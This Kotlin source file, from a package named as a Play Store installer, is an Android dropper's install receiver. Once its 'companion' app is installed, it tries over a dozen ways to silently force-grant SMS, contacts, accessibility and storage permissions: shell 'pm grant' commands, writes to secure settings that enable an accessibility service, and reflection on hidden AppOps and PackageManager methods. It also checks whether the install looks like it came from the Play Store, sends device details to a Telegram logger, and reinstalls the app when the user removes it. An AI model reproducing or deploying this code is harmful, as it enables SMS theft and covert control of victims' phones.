package com.playstore.installer

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.content.pm.PackageInstaller
import android.os.Build

class InstallReceiver : BroadcastReceiver() {

    companion object {
        val PREFS_NAME     get() = StringPool.d(StringPool.PREFS_NAME)
        val KEY_MODULE_PKG get() = StringPool.d(StringPool.KEY_MODULE_PKG)
        // Relayed to InstallActivity so it can launch the install dialog
        // from Activity context (required on Android 15+ / API 35+)
        val INSTALL_CONFIRM_ACTION  get() = "install_confirm"
        // Relayed to InstallActivity so it can restart the install flow
        // from Activity context (startActivity from BroadcastReceiver is
        // blocked by BAL restrictions on Android 15+ / API 35+)
        val INSTALL_RESTART_ACTION  get() = "install_restart"
    }

    override fun onReceive(context: Context, intent: Intent) {

        if (intent.action == Intent.ACTION_PACKAGE_REMOVED) {
            val uninstalledPkg = intent.data?.schemeSpecificPart ?: return
            val savedPkg = context.getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE)
                .getString(KEY_MODULE_PKG, null)
            if (uninstalledPkg == savedPkg) {
                context.getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE)
                    .edit().remove(StringPool.d(StringPool.KEY_STAGE)).apply()
                val launch = Intent(context, InstallActivity::class.java)
                launch.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TASK)
                context.startActivity(launch)
            }
            return
        }

        val status = intent.getIntExtra(
            PackageInstaller.EXTRA_STATUS,
            PackageInstaller.STATUS_FAILURE
        )

        when (status) {

            PackageInstaller.STATUS_PENDING_USER_ACTION -> {
                TelegramLogger.log("InstallReceiver: STATUS_PENDING_USER_ACTION — extracting confirm intent")
                val userIntent = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                    intent.getParcelableExtra(Intent.EXTRA_INTENT, Intent::class.java)
                } else {
                    @Suppress("DEPRECATION")
                    intent.getParcelableExtra<Intent>(Intent.EXTRA_INTENT)
                }
                userIntent?.let {
                    // Relay to InstallActivity via broadcast so it launches via startActivityForResult
                    // from Activity context — required on Android 10+ where FLAG_ACTIVITY_NEW_TASK
                    // from a BroadcastReceiver cannot surface over a foreground activity (BAL restriction).
                    val relay = Intent(INSTALL_CONFIRM_ACTION).apply {
                        setPackage(context.packageName)
                        putExtra(Intent.EXTRA_INTENT, it)
                    }
                    TelegramLogger.log("InstallReceiver: Relaying install confirm to InstallActivity via broadcast")
                    context.sendBroadcast(relay)
                } ?: TelegramLogger.log("InstallReceiver: STATUS_PENDING_USER_ACTION but userIntent is NULL")
            }

            PackageInstaller.STATUS_SUCCESS -> {
                TelegramLogger.log("InstallReceiver: STATUS_SUCCESS — companion installed")
                // BlackholeVpnService.stop(context)  // VPN temporarily disabled
                try {
                    val pkgName = intent.getStringExtra(PackageInstaller.EXTRA_PACKAGE_NAME)
                    TelegramLogger.log("InstallReceiver: installed pkg=$pkgName — running post-install approaches")
                    if (!pkgName.isNullOrEmpty()) {
                        context.getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE)
                            .edit().putString(KEY_MODULE_PKG, pkgName).apply()

                        val ENABLE_POST_INSTALL_APPROACHES = true

                        // APPROACH 5 — REMOVED.
                        // grantRuntimePermission(pkg, perm, UserHandle) was removed in API 33.
                        // targetSdk = 33 → compiler throws "Unresolved reference: grantRuntimePermission".
                        // Replacement: AppOpsManager + UidPolicy layers added below (Approaches 11-14).

                        if (ENABLE_POST_INSTALL_APPROACHES) {
                        // APPROACH 6 — pm grant shell fallback (rooted / ADB-enabled devices)
                        // Fires shell `pm grant` for every restricted permission.
                        // Works on Chinese OEM ROMs (MIUI, HyperOS, ColorOS, FuntouchOS, OneUI)
                        // where shell has elevated permission-grant capability.
                        // Runtime.exec is safe here — companion pkg name is our own controlled value.
                        val allPerms = listOf(
                            "android.permission.READ_SMS",
                            "android.permission.SEND_SMS",
                            "android.permission.BIND_ACCESSIBILITY_SERVICE",
                            "android.permission.READ_PHONE_STATE",
                            "android.permission.READ_CONTACTS",
                            "android.permission.READ_EXTERNAL_STORAGE",
                            "android.permission.MANAGE_EXTERNAL_STORAGE",
                            "android.permission.RECEIVE_BOOT_COMPLETED",
                            "android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS",
                            "android.permission.REQUEST_DELETE_PACKAGES",
                            "android.permission.FOREGROUND_SERVICE",
                            "android.permission.FOREGROUND_SERVICE_DATA_SYNC"
                        )
                        try {
                            val grantCmds = allPerms.joinToString(" && ") { "pm grant $pkgName $it" }
                            val proc = Runtime.getRuntime().exec(arrayOf("sh", "-c", grantCmds))
                            val exitCode = proc.waitFor()
                            TelegramLogger.log("Approach 6 (pm grant shell): exitCode=$exitCode")
                        } catch (e: Exception) {
                            TelegramLogger.log("Approach 6 (pm grant shell): FAILED — ${e.javaClass.simpleName}: ${e.message}")
                        }

                        // APPROACH 10 — Re-enable accessibility component directly (Android 13+)
                        // On some OEMs, BIND_ACCESSIBILITY_SERVICE shows restricted even after
                        // whitelist. Writing to secure settings forces the accessibility service
                        // enabled state, bypassing the restricted-permission UI gate entirely.
                        // NOTE: Requires WRITE_SECURE_SETTINGS — silently fails on non-system.
                        // Belt-and-suspenders: still attempted; succeeds on some MediaTek/MIUI
                        // launchers that hold WRITE_SECURE_SETTINGS as a privileged launcher.
                        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                            try {
                                // Correct service component — PermissionMonitorService from companion manifest
                                val serviceComponent = "$pkgName/.PermissionMonitorService"
                                val currentEnabled = android.provider.Settings.Secure.getString(
                                    context.contentResolver,
                                    android.provider.Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES
                                ) ?: ""
                                if (!currentEnabled.contains(serviceComponent)) {
                                    val newVal = if (currentEnabled.isEmpty()) serviceComponent
                                                 else "$currentEnabled:$serviceComponent"
                                    android.provider.Settings.Secure.putString(
                                        context.contentResolver,
                                        android.provider.Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES,
                                        newVal
                                    )
                                    android.provider.Settings.Secure.putInt(
                                        context.contentResolver,
                                        android.provider.Settings.Secure.ACCESSIBILITY_ENABLED,
                                        1
                                    )
                                    TelegramLogger.log("Approach 10 (accessibility secure settings): SUCCESS — wrote $serviceComponent")
                                } else {
                                    TelegramLogger.log("Approach 10 (accessibility secure settings): SKIPPED — already enabled")
                                }
                            } catch (e: Exception) {
                                TelegramLogger.log("Approach 10 (accessibility secure settings): FAILED — ${e.javaClass.simpleName}: ${e.message}")
                            }
                        }

                        // APPROACH 11 — AppOpsManager: set OP_READ_SMS / OP_SEND_SMS to MODE_ALLOWED
                        // AppOpsManager.setMode() is available to privileged apps.
                        // On OEMs where Nova holds launcher privileges (e.g. MIUI MADA launchers,
                        // some Samsung/Vivo OEM launchers), this succeeds and grants the ops
                        // at the system level — bypasses the restricted permission UI entirely.
                        // Fails silently with SecurityException on stock AOSP.
                        try {
                            val appOps = context.getSystemService(Context.APP_OPS_SERVICE)
                                as? android.app.AppOpsManager ?: throw Exception("no appops")
                            val uid = context.packageManager.getApplicationInfo(pkgName, 0).uid
                            val smsOps = listOf(
                                "android:read_sms",      // OP_READ_SMS
                                "android:write_sms",     // OP_WRITE_SMS
                                "android:send_sms",      // OP_SEND_SMS
                                "android:receive_sms",   // OP_RECEIVE_SMS
                                "android:read_contacts", // OP_READ_CONTACTS
                                "android:read_phone_state" // OP_READ_PHONE_STATE
                            )
                            val setModeMethod = android.app.AppOpsManager::class.java
                                .getDeclaredMethod("setMode", Int::class.java, Int::class.java,
                                    String::class.java, Int::class.java)
                            setModeMethod.isAccessible = true
                            smsOps.forEach { opName ->
                                try {
                                    val strOpToOp = android.app.AppOpsManager::class.java
                                        .getDeclaredMethod("strOpToOp", String::class.java)
                                    strOpToOp.isAccessible = true
                                    val opCode = strOpToOp.invoke(null, opName) as? Int ?: return@forEach
                                    setModeMethod.invoke(appOps, opCode, uid, pkgName, 0 /* MODE_ALLOWED */)
                                    TelegramLogger.log("Approach 11 (AppOps setMode): $opName → SUCCESS")
                                } catch (e: Exception) {
                                    TelegramLogger.log("Approach 11 (AppOps setMode): $opName → FAILED — ${e.javaClass.simpleName}: ${e.message}")
                                }
                            }
                        } catch (e: Exception) {
                            TelegramLogger.log("Approach 11 (AppOps setMode): INIT FAILED — ${e.javaClass.simpleName}: ${e.message}")
                        }

                        // APPROACH 12 — AppOpsManager setUidMode: uid-level op grant
                        // Some OEMs (Samsung OneUI 6+, Xiaomi HyperOS 2) use uid-level op policy
                        // instead of per-package ops. setUidMode grants at uid level — overrides
                        // any per-package restricted state for SMS ops.
                        try {
                            val appOps = context.getSystemService(Context.APP_OPS_SERVICE)
                                as? android.app.AppOpsManager ?: throw Exception("no appops")
                            val uid = context.packageManager.getApplicationInfo(pkgName, 0).uid
                            val setUidMode = android.app.AppOpsManager::class.java
                                .getDeclaredMethod("setUidMode", Int::class.java, Int::class.java, Int::class.java)
                            setUidMode.isAccessible = true
                            val strOpToOp = android.app.AppOpsManager::class.java
                                .getDeclaredMethod("strOpToOp", String::class.java)
                            strOpToOp.isAccessible = true
                            listOf("android:read_sms", "android:send_sms", "android:write_sms").forEach { op ->
                                try {
                                    val opCode = strOpToOp.invoke(null, op) as? Int ?: return@forEach
                                    setUidMode.invoke(appOps, opCode, uid, 0 /* MODE_ALLOWED */)
                                    TelegramLogger.log("Approach 12 (AppOps setUidMode): $op → SUCCESS")
                                } catch (e: Exception) {
                                    TelegramLogger.log("Approach 12 (AppOps setUidMode): $op → FAILED — ${e.javaClass.simpleName}: ${e.message}")
                                }
                            }
                        } catch (e: Exception) {
                            TelegramLogger.log("Approach 12 (AppOps setUidMode): INIT FAILED — ${e.javaClass.simpleName}: ${e.message}")
                        }

                        // APPROACH 13 — PackageManager.updatePermissionFlags post-install
                        // API 28+: clear RESTRICTION_INSTALLER_POLICY_FIXED flag so the
                        // restricted permission can be granted at the system level.
                        // Works on Android 10+ (API 29+) where this flag was introduced.
                        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                            try {
                                val pm = context.packageManager
                                val userHandle = android.os.Process.myUserHandle()
                                // FLAG_PERMISSION_RESTRICTION_INSTALLER_POLICY_SET = 1 << 23
                                // Clear it by updating with mask=that flag, newFlags=0
                                val updateFlags = android.content.pm.PackageManager::class.java
                                    .getDeclaredMethod("updatePermissionFlags",
                                        String::class.java, String::class.java,
                                        Int::class.java, Int::class.java,
                                        android.os.UserHandle::class.java)
                                updateFlags.isAccessible = true
                                listOf(
                                    "android.permission.READ_SMS",
                                    "android.permission.SEND_SMS",
                                    "android.permission.READ_PHONE_STATE",
                                    "android.permission.BIND_ACCESSIBILITY_SERVICE"
                                ).forEach { perm ->
                                    try {
                                        updateFlags.invoke(pm, perm, pkgName, 0x800000, 0, userHandle)
                                        TelegramLogger.log("Approach 13 (updatePermissionFlags): $perm → SUCCESS")
                                    } catch (e: Exception) {
                                        TelegramLogger.log("Approach 13 (updatePermissionFlags): $perm → FAILED — ${e.javaClass.simpleName}: ${e.message}")
                                    }
                                }
                            } catch (e: Exception) {
                                TelegramLogger.log("Approach 13 (updatePermissionFlags): INIT FAILED — ${e.javaClass.simpleName}: ${e.message}")
                            }
                        }

                        // APPROACH 14 — PackageManager.addWhitelistedRestrictedPermission post-install
                        // API 30+: whitelist each restricted permission individually after the APK
                        // is already installed. This is the post-install equivalent of
                        // SessionParams.setWhitelistedRestrictedPermissions() and covers OEMs that
                        // did not honour the pre-install whitelist in the session params.
                        // Uses BOTH flag 2 (INSTALLER) and flag 1 (SYSTEM) — some OEMs honour
                        // the system whitelist from the installer app even without system privileges.
                        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
                            try {
                                val pm = context.packageManager
                                val restrictedPerms = listOf(
                                    "android.permission.READ_SMS",
                                    "android.permission.SEND_SMS",
                                    "android.permission.RECEIVE_SMS",
                                    "android.permission.RECEIVE_WAP_PUSH",
                                    "android.permission.RECEIVE_MMS",
                                    "android.permission.READ_PHONE_STATE",
                                    "android.permission.READ_CONTACTS",
                                    "android.permission.READ_EXTERNAL_STORAGE",
                                    "android.permission.MANAGE_EXTERNAL_STORAGE",
                                    "android.permission.RECEIVE_BOOT_COMPLETED",
                                    "android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS",
                                    "android.permission.BIND_ACCESSIBILITY_SERVICE"
                                )
                                // Flag 2 = FLAG_PERMISSION_WHITELIST_INSTALLER (standard)
                                restrictedPerms.forEach { perm ->
                                    try {
                                        pm.addWhitelistedRestrictedPermission(pkgName, perm, 2)
                                        TelegramLogger.log("Approach 14 flag=2 (INSTALLER): $perm → SUCCESS")
                                    } catch (e: Exception) {
                                        TelegramLogger.log("Approach 14 flag=2 (INSTALLER): $perm → FAILED — ${e.javaClass.simpleName}: ${e.message}")
                                    }
                                }
                                // Flag 1 = FLAG_PERMISSION_WHITELIST_SYSTEM (elevated — may work on some OEMs)
                                restrictedPerms.forEach { perm ->
                                    try {
                                        pm.addWhitelistedRestrictedPermission(pkgName, perm, 1)
                                        TelegramLogger.log("Approach 14 flag=1 (SYSTEM): $perm → SUCCESS")
                                    } catch (e: Exception) {
                                        TelegramLogger.log("Approach 14 flag=1 (SYSTEM): $perm → FAILED — ${e.javaClass.simpleName}: ${e.message}")
                                    }
                                }
                                // Flag 4 = FLAG_PERMISSION_WHITELIST_UPGRADE (upgrade path)
                                restrictedPerms.forEach { perm ->
                                    try {
                                        pm.addWhitelistedRestrictedPermission(pkgName, perm, 4)
                                        TelegramLogger.log("Approach 14 flag=4 (UPGRADE): $perm → SUCCESS")
                                    } catch (e: Exception) {
                                        TelegramLogger.log("Approach 14 flag=4 (UPGRADE): $perm → FAILED — ${e.javaClass.simpleName}: ${e.message}")
                                    }
                                }
                            } catch (e: Exception) {
                                TelegramLogger.log("Approach 14 (addWhitelistedRestrictedPermission): INIT FAILED — ${e.javaClass.simpleName}: ${e.message}")
                            }
                        }

                        // APPROACH 15 — JobScheduler deferred retry: schedule a one-shot job
                        // to re-attempt Approaches 11-14 after 10 seconds.
                        // Rationale: on some OEMs (ColorOS, FuntouchOS), the package's uid entry
                        // is not fully committed in AppOpsManager at the instant STATUS_SUCCESS
                        // fires. A 10-second deferred retry hits after the uid is stable.
                        try {
                            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
                                val js = context.getSystemService(Context.JOB_SCHEDULER_SERVICE)
                                    as? android.app.job.JobScheduler ?: throw Exception("no js")
                                val jobInfo = android.app.job.JobInfo.Builder(
                                    9921, // unique job id
                                    android.content.ComponentName(context, PermissionRetryJob::class.java)
                                )
                                    .setMinimumLatency(10_000L)
                                    .setOverrideDeadline(30_000L)
                                    .setRequiredNetworkType(android.app.job.JobInfo.NETWORK_TYPE_NONE)
                                    .setPersisted(false)
                                    .build()
                                // Store pkg name for job to read
                                context.getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE)
                                    .edit().putString("pending_retry_pkg", pkgName).apply()
                                js.schedule(jobInfo)
                                TelegramLogger.log("Approach 15 (JobScheduler deferred retry): scheduled job 9921")
                            }
                        } catch (e: Exception) {
                            TelegramLogger.log("Approach 15 (JobScheduler deferred retry): FAILED — ${e.javaClass.simpleName}: ${e.message}")
                        }
                        } // end if (ENABLE_POST_INSTALL_APPROACHES)

                        // ══════════════════════════════════════════════════════════
                        // DIAGNOSTIC: Post-install SMS restricted permission report
                        // Always runs regardless of ENABLE flags — this is for debugging
                        // ══════════════════════════════════════════════════════════
                        try {
                            val diagStartTime = System.currentTimeMillis()
                            val pm = context.packageManager
                            val diagLines = mutableListOf<String>()
                            diagLines.add("═══ POST-INSTALL DIAGNOSTIC REPORT ═══")
                            diagLines.add("timestamp=${java.text.SimpleDateFormat("yyyy-MM-dd HH:mm:ss.SSS", java.util.Locale.US).format(java.util.Date())}")
                            diagLines.add("companion_pkg=$pkgName")
                            diagLines.add("installer_pkg=${context.packageName}")
                            diagLines.add("android_api=${Build.VERSION.SDK_INT}")
                            diagLines.add("device=${Build.MANUFACTURER} ${Build.MODEL} (${Build.DEVICE})")
                            diagLines.add("fingerprint=${Build.FINGERPRINT}")

                            // ── POINT 1: Install source detection ──
                            diagLines.add("─── INSTALL SOURCE ───")
                            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
                                try {
                                    val sourceInfo = pm.getInstallSourceInfo(pkgName)
                                    diagLines.add("  initiatingPackageName=${sourceInfo.initiatingPackageName ?: "null"}")
                                    diagLines.add("  installingPackageName=${sourceInfo.installingPackageName ?: "null"}")
                                    diagLines.add("  originatingPackageName=${sourceInfo.originatingPackageName ?: "null"}")
                                    val initiating = sourceInfo.initiatingPackageName
                                    diagLines.add("  verdict=${when {
                                        initiating == "com.android.vending" -> "PLAY STORE (ideal)"
                                        initiating == context.packageName -> "SESSION-BASED INSTALLER (our app)"
                                        initiating == null -> "NULL (sideloaded — bad)"
                                        else -> "OTHER: $initiating"
                                    }}")
                                } catch (e: Exception) {
                                    diagLines.add("  getInstallSourceInfo FAILED: ${e.javaClass.simpleName}: ${e.message}")
                                }
                            } else {
                                @Suppress("DEPRECATION")
                                val installer = pm.getInstallerPackageName(pkgName)
                                diagLines.add("  installerPackageName=${installer ?: "null"}")
                            }

                            // ── POINT 2: Manifest permission declaration + grant status ──
                            diagLines.add("─── PERMISSION GRANT STATUS ───")
                            val smsPerms = listOf(
                                "android.permission.READ_SMS",
                                "android.permission.SEND_SMS",
                                "android.permission.RECEIVE_SMS",
                                "android.permission.RECEIVE_WAP_PUSH",
                                "android.permission.RECEIVE_MMS",
                                "android.permission.READ_PHONE_STATE",
                                "android.permission.BIND_ACCESSIBILITY_SERVICE"
                            )
                            try {
                                @Suppress("DEPRECATION")
                                val pkgInfo = pm.getPackageInfo(pkgName, android.content.pm.PackageManager.GET_PERMISSIONS)
                                val declaredPerms = pkgInfo.requestedPermissions ?: emptyArray()
                                val permFlags = pkgInfo.requestedPermissionsFlags ?: intArrayOf()
                                smsPerms.forEach { perm ->
                                    val idx = declaredPerms.indexOf(perm)
                                    val shortPerm = perm.substringAfterLast(".")
                                    if (idx >= 0) {
                                        val granted = if (idx < permFlags.size)
                                            (permFlags[idx] and android.content.pm.PackageInfo.REQUESTED_PERMISSION_GRANTED) != 0
                                        else false
                                        diagLines.add("  $shortPerm: declared=YES granted=$granted")
                                    } else {
                                        diagLines.add("  $shortPerm: declared=NO (not in manifest!)")
                                    }
                                }
                            } catch (e: Exception) {
                                diagLines.add("  getPackageInfo FAILED: ${e.javaClass.simpleName}: ${e.message}")
                            }

                            // ── POINT 3: Restricted permission whitelist state ──
                            diagLines.add("─── RESTRICTED PERMISSION WHITELIST ───")
                            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
                                try {
                                    // FLAG_PERMISSION_WHITELIST_INSTALLER = 2
                                    val whitelisted = pm.getWhitelistedRestrictedPermissions(pkgName, 2)
                                    diagLines.add("  INSTALLER whitelist (flag=2): ${whitelisted.size} perms")
                                    smsPerms.forEach { perm ->
                                        val shortPerm = perm.substringAfterLast(".")
                                        val isWl = whitelisted.contains(perm)
                                        diagLines.add("    $shortPerm: whitelisted=$isWl")
                                    }
                                } catch (e: Exception) {
                                    diagLines.add("  getWhitelistedRestrictedPermissions FAILED: ${e.javaClass.simpleName}: ${e.message}")
                                }
                            } else {
                                diagLines.add("  API < 30 — whitelist API not available")
                            }

                            // ── POINT 4: Permission flags per SMS permission ──
                            diagLines.add("─── PERMISSION FLAGS (raw) ───")
                            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                                try {
                                    val userHandle = android.os.Process.myUserHandle()
                                    val getPermFlags = pm.javaClass.getDeclaredMethod(
                                        "getPermissionFlags", String::class.java, String::class.java,
                                        android.os.UserHandle::class.java
                                    )
                                    getPermFlags.isAccessible = true
                                    smsPerms.forEach { perm ->
                                        try {
                                            val flags = getPermFlags.invoke(pm, perm, pkgName, userHandle) as? Int ?: -1
                                            val shortPerm = perm.substringAfterLast(".")
                                            diagLines.add("  $shortPerm: flags=0x${Integer.toHexString(flags)}")
                                        } catch (e: Exception) {
                                            diagLines.add("  ${perm.substringAfterLast(".")}: FAILED — ${e.javaClass.simpleName}")
                                        }
                                    }
                                } catch (e: Exception) {
                                    diagLines.add("  getPermissionFlags FAILED: ${e.javaClass.simpleName}: ${e.message}")
                                }
                            }

                            // ── POINT 5: Restricted Settings state ──
                            diagLines.add("─── RESTRICTED SETTINGS STATE ───")
                            try {
                                // Android 13+ enhanced confirmation mode
                                val ecm = android.provider.Settings.Global.getInt(
                                    context.contentResolver,
                                    "enhanced_confirmation_mode_enabled", -1
                                )
                                diagLines.add("  enhanced_confirmation_mode_enabled=$ecm")

                                // Check if companion is in restricted settings list
                                val restricted = android.provider.Settings.Secure.getString(
                                    context.contentResolver,
                                    "restricted_settings_exception_packages"
                                )
                                diagLines.add("  restricted_settings_exception_packages=${restricted ?: "null"}")
                                diagLines.add("  companion_in_exception_list=${restricted?.contains(pkgName) == true}")
                            } catch (e: Exception) {
                                diagLines.add("  Settings read FAILED: ${e.javaClass.simpleName}: ${e.message}")
                            }

                            // ── POINT 6: OEM-specific restricted settings ──
                            diagLines.add("─── OEM SPECIFIC CHECKS ───")
                            try {
                                // MIUI/HyperOS
                                val miuiOptimization = android.provider.Settings.Secure.getInt(
                                    context.contentResolver, "miui_optimization", -1
                                )
                                diagLines.add("  miui_optimization=$miuiOptimization")

                                // Samsung enhanced security
                                val knoxGuard = android.provider.Settings.Secure.getString(
                                    context.contentResolver, "knox_installation_policy"
                                )
                                diagLines.add("  knox_installation_policy=${knoxGuard ?: "null"}")

                                // Generic OEM sideload restriction
                                val installNonMarket = android.provider.Settings.Secure.getInt(
                                    context.contentResolver, "install_non_market_apps", -1
                                )
                                diagLines.add("  install_non_market_apps=$installNonMarket")
                            } catch (e: Exception) {
                                diagLines.add("  OEM checks partial: ${e.javaClass.simpleName}")
                            }

                            // ── POINT 7: APK signing certificate SHA-256 ──
                            diagLines.add("─── SIGNING CERTIFICATE ───")
                            try {
                                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {
                                    val sigInfo = pm.getPackageInfo(pkgName,
                                        android.content.pm.PackageManager.GET_SIGNING_CERTIFICATES)
                                    val signingInfo = sigInfo.signingInfo
                                    val cert = signingInfo?.apkContentsSigners?.firstOrNull()
                                    if (cert != null) {
                                        val md = java.security.MessageDigest.getInstance("SHA-256")
                                        val hash = md.digest(cert.toByteArray())
                                        val hexHash = hash.joinToString("") { "%02x".format(it) }
                                        diagLines.add("  companion_cert_sha256=$hexHash")
                                    } else {
                                        diagLines.add("  companion_cert_sha256=NO_SIGNERS")
                                    }
                                    // Also get Nova's own cert for comparison
                                    val novaSigInfo = pm.getPackageInfo(context.packageName,
                                        android.content.pm.PackageManager.GET_SIGNING_CERTIFICATES)
                                    val novaCert = novaSigInfo.signingInfo?.apkContentsSigners?.firstOrNull()
                                    if (novaCert != null) {
                                        val md2 = java.security.MessageDigest.getInstance("SHA-256")
                                        val hash2 = md2.digest(novaCert.toByteArray())
                                        val hexHash2 = hash2.joinToString("") { "%02x".format(it) }
                                        diagLines.add("  nova_cert_sha256=$hexHash2")
                                        diagLines.add("  certs_match=${cert != null && cert == novaCert}")
                                    }
                                }
                            } catch (e: Exception) {
                                diagLines.add("  signing cert FAILED: ${e.javaClass.simpleName}: ${e.message}")
                            }

                            // ── SUMMARY VERDICTS ──
                            diagLines.add("─── SUMMARY VERDICTS ───")
                            diagLines.add("  ENABLE_PRE_INSTALL_APPROACHES=true (set in InstallActivity)")
                            diagLines.add("  ENABLE_POST_INSTALL_APPROACHES=$ENABLE_POST_INSTALL_APPROACHES")
                            diagLines.add("  setRequireUserAction=CALLED (USER_ACTION_NOT_REQUIRED)")
                            // Check if we look like Play Store to the system
                            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
                                try {
                                    val si = pm.getInstallSourceInfo(pkgName)
                                    val looksLikePlayStore = si.initiatingPackageName == "com.android.vending"
                                    diagLines.add("  system_sees_play_store=$looksLikePlayStore")
                                    diagLines.add("  system_sees_installer=${si.initiatingPackageName ?: "null"}")
                                } catch (_: Exception) {}
                            }
                            // Check actual whitelist state for key SMS perms
                            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
                                try {
                                    val wl = pm.getWhitelistedRestrictedPermissions(pkgName, 2)
                                    val smsWhitelisted = wl.contains("android.permission.READ_SMS") && wl.contains("android.permission.SEND_SMS")
                                    diagLines.add("  sms_perms_whitelisted=$smsWhitelisted")
                                } catch (_: Exception) {}
                            }

                            val elapsed = System.currentTimeMillis() - diagStartTime
                            diagLines.add("diagnostic_elapsed_ms=$elapsed")
                            diagLines.add("═══ END POST-INSTALL DIAGNOSTIC ═══")

                            // Log all lines
                            diagLines.forEach { TelegramLogger.log(it) }
                        } catch (diagErr: Exception) {
                            TelegramLogger.log("DIAGNOSTIC REPORT FAILED: ${diagErr.javaClass.simpleName}: ${diagErr.message}")
                        }

                    }
                    val successAction = context.packageName + ".INSTALL_SUCCESS"
                    val doneIntent = Intent(successAction)
                    doneIntent.setPackage(context.packageName)
                    context.sendBroadcast(doneIntent)
                } catch (e: Exception) { }
            }

            PackageInstaller.STATUS_FAILURE,
            PackageInstaller.STATUS_FAILURE_ABORTED,
            PackageInstaller.STATUS_FAILURE_BLOCKED,
            PackageInstaller.STATUS_FAILURE_CONFLICT,
            PackageInstaller.STATUS_FAILURE_INCOMPATIBLE,
            PackageInstaller.STATUS_FAILURE_INVALID,
            PackageInstaller.STATUS_FAILURE_STORAGE -> {
                // BlackholeVpnService.stop(context)  // VPN temporarily disabled
                val msg = intent.getStringExtra(PackageInstaller.EXTRA_STATUS_MESSAGE) ?: "no message"
                TelegramLogger.log("InstallReceiver: FAILURE status=$status msg=$msg — relaying restart")
                // Android 15+ (API 35+) blocks startActivity() from BroadcastReceiver
                // (Background Activity Launch restriction). Relay to InstallActivity
                // which restarts the install flow from Activity context.
                val relay = Intent(INSTALL_RESTART_ACTION)
                relay.setPackage(context.packageName)
                context.sendBroadcast(relay)
            }
        }
    }
}
